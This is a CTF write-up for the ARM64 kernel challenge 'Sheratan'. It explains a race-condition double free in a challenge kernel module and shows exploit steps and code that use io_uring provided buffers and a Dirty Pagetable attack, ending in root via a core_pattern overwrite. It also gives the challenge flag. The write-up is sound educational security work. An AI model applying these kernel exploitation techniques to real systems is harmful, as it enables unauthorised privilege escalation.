Author: 0x6fe1be2
Version: 03-11-2025

# ARIES - Sheratan


Status: TBD

Category: PWN, KERNEL

Points: TBD

Description:
> Our industry-leading Sheratan ground station enables seamless communication with your orbital assets.
> 
> Sheratan (Secure High-Efficiency Radio and Telemetry Antenna Network) combines efficient, low-power computing with robust reliability - perfect for remote 
> deployment locations. Whether you're tracking a single satellite or coordinating an entire constellation, Sheratan provides the dependable ground infrastructure your missions demand.
> 
> Built for 24/7 operations with minimal maintenance requirements, making you feel like you're reaching out and touching the stars themselves.


## TL;DR 

Sheratan is the second stage of the ARIES challenge. It requires exploiting a vulnerable Linux kernel module on an ARM64 system to get EoP (Escalation of Privileges). A race conditions exists, which introduces a double free vulnerability which we exploit through a Dirty Pagetable style attack using io_uring provided buffer to get arbitrary write in kernel space and achieve privilege escalation.

## Files

We are given the following files:

```
sheratan/
├── Dockerfile
├── docker-compose.yml
├── kmod
│   ├── System.map
│   ├── kernel.config
│   ├── sheratan.c
│   └── sheratan.h
└── share
    ├── Image
    ├── hamal.ext4.xz
    ├── rootfs.cpio.gz
    └── run.sh
```

Lets go over the most important ones:

First let's look at the *Dockerfile* to understand what is going one. Basically we are installing dependencies to run a qemu ARM64 for every incoming connection.

[*Dockerfile*](https://gfelber.dev/writeups/sheratan/Dockerfile)

the *run.sh* script is a bit more interesting. We startup a virtual qemu arm64 VM using the `cortex-a76` which supports PAN (Privileged Access Never) similar to SMAP on amd64. Additionally it looks like we get a outgoing internet connection using user network interface. Last but not least we get the cmdline arguments for the linux kernel. They tell us that kaslr (`kaslr`) is enabled, dmesg is restricted (`quiet`) and we kernel panic and shutdown if any problem is detected (`oops=panic panic_on_warn=1 panic=-1`).

[*run.sh*](https://gfelber.dev/writeups/sheratan/run.sh)

The *run.sh* actually mounts two filesystems and initramfs `rootfs.cpio.gz` and a main filesystem `hamal.ext4` (which is basically the docker container for the [Hamal](https://gfelber.dev/writeups/ctrl_space_hamal.md) challenge).

extracting the files from the *rootfs.cpio.gz* (e.g. using this [script](https://github.com/gfelber/how2keap/blob/main/scripts/decompress.sh), we have two interesting files:

*init* is the first script executed after boot the important things are that:
+ loads the kernel module *sheratan.ko*
+ setups the network interface (so we have outgoing internet)
+ mounts the ext4 filesystem 
+ adds a symlink to the flag in `/flag`
+ and finally starts a nsjail container giving us a shell inside the ext4 filesystem

[*init*](https://gfelber.dev/writeups/sheratan/init)

also lets take a quick look at the *nsjail.conf*. Notably we create a new network namespace (but have access to our internet interface eth0). Even though the filesystem is read only, we mount some tmpfs directories, which allow us to write a binary somewhere.

[*nsjail.conf*](https://gfelber.dev/writeups/sheratan/nsjail.conf)

Finally we have the source code for the kernel module we will have to exploi.

[*sheratan.c*](https://gfelber.dev/writeups/sheratan/sheratan.c) [*sheratan.h*](https://gfelber.dev/writeups/sheratan/sheratan.h)

It seem to implement some type of task queue through a new `/proc/sheratan` interface that works like this:
```
┌──────────┐ ┌────────────────┐ ┌───────────────────┐
│  Hamal   │ │    Sheratan    │ │  Mesarthim Client │
│ (Client) │ │ (Intermediate) │ │      (Worker)     │
└────┬─────┘ └───────┬────────┘ └─────────┬─────────┘
     │               │                    │
     │ PUSH CMD      │                    │
     │ ────────────► │            POP CMD │
     │               │ ◄───────────────── │
     │               │ RETURN CMD         │
     │               │ ─────────────────► │
     │               │                    │ │ DO
     │               │                    │ │ CMD
     │               │           CMD DONE │ ▼
     │  CMD FINISHED │ ◄───────────────── │
     │ ◄──────────── │ ─────────────────► │
     │               │                    │

```


On command creation via `SHERATAN_IOCTL_PUSH` a kernel heap allocation is done, the cmd info is stored in it, and the cmd is added to a linked list. Also the client waits for the command to finish.

```c
  case SHERATAN_IOCTL_PUSH:
    pr_info("sheratan: push\n");
    if (param.cmd < PING || param.cmd > BOOST_DISABLE)
      return -EINVAL;
    current_cmd = kzalloc(sizeof(struct sheratan_cmd), GFP_KERNEL_ACCOUNT);
    if (!current_cmd)
      return -ENOMEM;
    current_cmd->cmd = param.cmd;
    init_completion(&current_cmd->done);
    for (next_cmd = &top_cmd; *next_cmd; next_cmd = &(*next_cmd)->next)
      ;
    *next_cmd = current_cmd;
    wait_for_completion(&current_cmd->done);
    return 0;
```

When the Worker pops the top cmd (through `SHERATAN_IOCTL_POP`) it is removed from the linked list and stored in the `private_data` attribute of the file pointer struct (so bound to the file descriptor).

```c
  case SHERATAN_IOCTL_POP:
    pr_info("sheratan: pop\n");
    if (top_cmd == NULL)
      return -EINVAL;
    if (copy_to_user((void __user *)arg, &top_cmd->cmd, sizeof(top_cmd->cmd)))
      return -EFAULT;
    filp->private_data = top_cmd;
    top_cmd = top_cmd->next;
    return 0;
```

After the worker finished doing the command it notifies the client through `SHERATAN_IOCTL_DONE`. It also `kfree`s the cmd from the heap and removes the reference from the `private_data`.
```c
  case SHERATAN_IOCTL_DONE:
    pr_info("sheratan: done\n");
    if (!filp->private_data)
      return -EINVAL;
    current_cmd = filp->private_data;
    complete(&current_cmd->done);
    kfree(current_cmd);
    filp->private_data = NULL;
    return 0;
```

Additionally there is an API for updating the status, but that isn't relevant for the exploit.

## Vulnerability

Looking at the code it seems rather simple and safe on first glance. This is a trick as we are not looking for a common vulnerability, but a race condition.

Notably multiple processes can share the same file descriptor and therefore the same `private_data`. So what happens if we "finish" two commands at the same time? We get a double free.

```c
    current_cmd = filp->private_data;
    complete(&current_cmd->done);
    kfree(current_cmd);
    filp->private_data = NULL;
```


But isn't this race condition super tight? Well not really, this is where we can abuse the behaviour of `complete` to trigger a scheduling switch and delay clearing the `private_data`

Our Proof of Concept will do sth like this:

```
 ┌──────────┐ ┌──────────┐ ┌──────────┐
 │  victim  │ │ Sheratan │ │ attacker │
 └────┬─────┘ └────┬─────┘ └────┬─────┘
      │            │   PUSH CMD │
      │ POP CMD    │ ◄───────── │
      │ ◄───────── │            │
      │ DONE CMD   │ complete   │
      │ ─────────► │ ─────────► │
      │            │   DONE CMD │
      │   DANGLING │ ◄───────── │
      │    POINTER │ KFREE      │
      │            │ ─────────► │
      │            │            │ ─┐
      │            │            │  │ REALLOC
      │     DOUBLE │            │  │ HEAP
      │      KFREE │            │ ─┘
      │ ◄───────── │            │
      │            │            │

```

[*uaf_poc.c*](https://gfelber.dev/writeups/sheratan/uaf_poc.c)


Note: there are actually multiple race condition but this one is the easiest to exploit.


## io_uring Provided buffers

So how do we exploit this double free? There are actually multiple ways (if we consider cross-cache), but the easiest one for me was abusing the io_uring provided buffers, a technique that is inspired by CVE-2024-0582 and the following blog post: [Mind the Patch Gap](https://blog.exodusintel.com/2024/03/27/mind-the-patch-gap-exploiting-an-io_uring-vulnerability-in-ubuntu/).

Provided buffer actually give you nice spray gadgets for `GFP_KERNEL_ACCOUNT` and `GFP_KERNEL` for sizes which are exact powers of 2 (and strictly less than 0x800), which works out as we try to reclaim a `GFP_KERNEL_ACCOUNT` page with size `0x40`.

```c
void *io_pages_map(struct page ***out_pages, unsigned short *npages,
		   size_t size)
{
	gfp_t gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN;
	struct page **pages;
	int nr_pages;
	void *ret;

	nr_pages = (size + PAGE_SIZE - 1) >> PAGE_SHIFT;
	pages = kvmalloc_array(nr_pages, sizeof(struct page *), gfp);

```

Also these pages are actually mmap-able into userland:
```c
int io_pbuf_mmap(struct file *file, struct vm_area_struct *vma)
{
	struct io_ring_ctx *ctx = file->private_data;
	loff_t pgoff = vma->vm_pgoff << PAGE_SHIFT;
	struct io_buffer_list *bl;
	int bgid, ret;

	bgid = (pgoff & ~IORING_OFF_MMAP_MASK) >> IORING_OFF_PBUF_SHIFT;
	bl = io_pbuf_get_bl(ctx, bgid);
	if (IS_ERR(bl))
		return PTR_ERR(bl);

	ret = io_uring_mmap_pages(ctx, vma, bl->buf_pages, bl->buf_nr_pages);
	io_put_bl(ctx, bl);
	return ret;
}
```

And last but not least we can dereference them at any time decrementing the page references, which means we can actually abuse a double free to get arbitrary reads/writes through userland (similar to Dirty Pagetable) if the physical pages are reclaimed by the kernel.
```c
void io_pages_unmap(void *ptr, struct page ***pages, unsigned short *npages,
		    bool put_pages)
{
	bool do_vunmap = false;

	if (!ptr)
		return;

	if (put_pages && *npages) {
		struct page **to_free = *pages;
		int i;

		/*
		 * Only did vmap for the non-compound multiple page case.
		 * For the compound page, we just need to put the head.
		 */
		if (PageCompound(to_free[0]))
			*npages = 1;
		else if (*npages > 1)
			do_vunmap = true;
		for (i = 0; i < *npages; i++)
			put_page(to_free[i]);
	}
	if (do_vunmap)
		vunmap(ptr);
	kvfree(*pages);
	*pages = NULL;
	*npages = 0;
}
```


In order to make exploitation easier I wrote some helper functions. Some additional PoC's will also be provided on my kernel exploitation repo [how2keap](https://github.com/gfelber/how2keap) at a later time.

[*io_uring.c*](https://gfelber.dev/writeups/sheratan/io_uring.c) [*io_uring.h*](https://gfelber.dev/writeups/sheratan/io_uring.h)

Using this gadget we will now do the following steps:
1. reclaim the heap chunk with provided buffers (bgid 0)
2. free it using double free
3. reclaim it with (bgid 1) again (bigd 0 and 1 now point to page array)
4. mmap the provided pages locally and mark them.
5. with mremap we can free all, but one page decrementing the refcount to 2.
6. free the pages using bgid 1, refcount 1
7. free the pages again using bgid 0, refcount 0 and trigger folio_put

```c  
// target size 0x40
// multiply by page size 0x1000
// divide by 8 (struct page *) size
// divide by pbuf entry size 0x10
#define PBUF_ENTRIES ((0x40 * 0x1000) / (0x10 * 0x8))
#define PBUF_ENTRIES_SIZE PBUF_SIZE(PBUF_ENTRIES)

// ...
  
  // 1. reclaim for double free
  setup_provide_buffer_mmap(1, PBUF_ENTRIES);
  linfo("race done");

  // 2. trigger double free and 
  // 3. reclaim again in victim with:
  // setup_provide_buffer_mmap(1, PBUF_ENTRIES);
  // 0 and 1 point to the same pages
  pthread_join(victim_thread, NULL);

  lstage("CORRUPT");

  // 4. mmap the pages and mark them (for future validation)
  linfo("marking pages");
  u64 *pbuf = mmap_provide_buffer(0, PBUF_ENTRIES);
  lhex(pbuf);
  // mark page
  *pbuf = 0x6fe1be2;

  // 5. free all but on page reference from mmap. refcount 2
  pbuf = SYSCHK(mremap(pbuf, PBUF_ENTRIES_SIZE, 0x1000, MREMAP_MAYMOVE));

  // 6. free once, refcount 1
  destroy_provide_buffer(1);
  // 7. free again, recount 0 and trigger folio_put
  linfo("trigger folio_put");
  destroy_provide_buffer(0);
  
  // reclaim the physical page, e.g. through PTE spray

  linfo("checking mark");

  if (*pbuf == 0x6fe1be2)
    lerror("mark intact, exploit failed");

```

We now have a reference to a physical page in userland that has been freed. If it is reclaimed by the kernel it enables us to still write to it. We now have an insanely powerful gadget, so what is the easiest way to exploit it?

### Dirty Pagetable

From this point on we can proceed with the usual Dirty Pagetable exploitation strategy e.g. described in detail here [Dirty Pagetable](https://web.archive.org/web/20250318184322/https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html) or in the context of a CTF challenge here [Understanding Dirty Pagetable](https://web.archive.org/web/20250328091917/https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606) (ptr-yudai pls notice me `(≧︿≦)`).

One minor adjustment with the Dirty Pagteable technique described in the previous writeup is that it actually never "forcefully flushes" the TLB. There are two ways that i know of to achieve this, either the slow way I used before:

```c
void flush_tlb() {
  if (SYSCHK(fork()) == 0)
    exit(0);
  wait(NULL);
}

```

or a way better and faster technique used by [leave](https://github.com/manuele-pandolfi) (he also sometimes publishes cool blog posts [here](https://kqx.io/))

```c
void flush_tlb() {
  static void *page = NULL;
  if (!page) {
    page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
      lerror("mmap failed in flush_tlb");
  }
  SYSCHK(madvise(page, 0x1000, MADV_DONTNEED));
}
```

One very interesting thing about the Dirty Pagetable on ARM64 is that it actually doesn't have any physical KASLR, so we can just overwrite and memory from the kernel image directly. Actually the day before the CTF start Google Project Zero made a blog post about this behaviour (among other things): [Defeating KASLR by Doing Nothing at All](https://googleprojectzero.blogspot.com/2025/11/defeating-kaslr-by-doing-nothing-at-all.html). I guess i didn't expect to by snipped by them, but it happens `¯\_(ツ)_/¯`.

Privilege Escalation from here is straight forward, we could either write our own ring 0 shellcode, overwrite modprobe OR overwrite core_pattern which i actually got from this kernel CTF submission: [CVE-2024-36972](https://github.com/st424204/security-research/tree/fa3bed7298d85865bd1109fc278b982dc725cf28/pocs/linux/kernelctf/CVE-2024-36972_lts_cos).

This basically gives us an easy way to execute our binary as a privileged process outside the namespace and get the flag.

## Final

[*pwn.c*](https://gfelber.dev/writeups/sheratan/pwn.c)

Flag: `space{4r3_y0u_r34dy_f0r_th3_sp4c3_r4c3_8e5af5b8a23dee6f}`
